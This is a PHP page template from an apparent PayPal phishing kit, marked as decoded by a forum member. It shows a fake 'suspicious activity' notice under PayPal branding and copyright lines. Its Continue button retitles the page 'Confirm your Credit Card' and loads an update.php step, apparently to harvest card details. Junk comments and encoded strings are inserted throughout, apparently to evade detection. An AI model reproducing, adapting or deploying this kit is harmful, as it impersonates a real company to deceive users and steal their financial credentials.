<?php
// Decoded by Girudatsu.com Member

$A_oTANQDm_I = 'date';
$eTqKRUPT_Tjl = 'date';
include 'inc/crypt.php';
echo '<!' . xCrypt(56 - -44, 576 - 76) . '>';
$A_oTANQDm_I = 'date';
$eTqKRUPT_Tjl = 'date';
include_once 'inc/language.php';
echo '<!' . xCrypt(84 - -16, 414 - -86) . '>';
?>
<script type="<?php
echo xTextEncode('text/javascript');
?>
">
	// history.pushState('data', '','Suspecious_Activity');
	$("#safety_btn").click(function(){
		$("#loader").css('display', 'block');
		$("#loader").animate({ opacity: '1'}, 500, null);
		setTimeout(function() {
			document.title='Confirm your Credit Card';
			$("#ajax").load("update.php");
			$("#loader").animate({ opacity: '0'}, 500, function(){
				$("#loader").css('display', 'none');
			});
		}, 3000);
	});
</script>
<?php
echo '<!' . xCrypt(167 + -67, 322 + 178) . '>';
?>
<div id="<?php
echo xTextEncode('safe_header');
?>
">
	<div class="<?php
echo xTextEncode('container');
?>
">
		<div class="<?php
echo xTextEncode('row');
?>
">
			<div class="<?php
echo xTextEncode('four columns');
?>
" id="<?php
echo xTextEncode('shield');
?>
">
				<?php
echo $language['suspecious']['1'];
?>
			</div>
			<div class="<?php
echo xTextEncode('eight columns');
?>
" id="<?php
echo xTextEncode('safety');
?>
">
				<h4><?php
echo $language['suspecious']['2'];
?>
</h4>
				<p><?php
echo $language['suspecious']['3'];
?>
</p>
				<button type="<?php
echo xTextEncode('button');
?>
" id="<?php
echo xTextEncode('safety_btn');
?>
" class="<?php
echo xTextEncode('button-primary twelve columns u-full-width');
?>
">Continue</button>
			</div>
		</div>
<?php
echo '<!' . xCrypt(190 + -90, 22 + 478) . '>';
?>
		<div class="<?php
echo xTextEncode('row');
?>
">
			<div id="<?php
echo xTextEncode('footer_suspecious');
?>
" class="<?php
echo xTextEncode('phonex');
?>
">
				<ul>
					<li>Contact</li>
					<li>Security Center</li>
					<li>Sign off</li>
				</ul>
			</div>
			<div id="<?php
echo xTextEncode('footer_suspecious_dark');
?>
" class="<?php
echo xTextEncode('phonex');
?>
">
				Copyright © 1999-<?php
echo @date('Y');
?>
 <?php
echo xTextEncode('PayPal. All rights reserved. Privacy legal agreements');
?>
			</div>
		</div>
<?php
echo '<!' . xCrypt(161 + -61, 733 - 233) . '>';
?>
	</div>
</div>
<?php
echo '<!' . xCrypt(4 + 96, 180 + 320) . '>';
?>
	<div id="<?php
echo xTextEncode('footer_suspecious');
?>
" class="<?php
echo xTextEncode('desktopx');
?>
">
		<ul>
			<li><?php
echo xTextEncode('Contact');
?>
</li>
			<li><?php
echo xTextEncode('Security Center');
?>
</li>
			<li><?php
echo xTextEncode('Sign off');
?>
</li>
		</ul>
	</div>
	<div id="<?php
echo xTextEncode('footer_suspecious_dark');
?>
" class="<?php
echo xTextEncode('desktopx');
?>
">
		Copyright © 1999-<?php
echo @date('Y');
?>
 <?php
echo xTextEncode('PayPal. All rights reserved. Privacy legal agreements');
?>
	</div>
<?php
echo '<!' . xCrypt(74 - -26, 506 - 6) . '>';
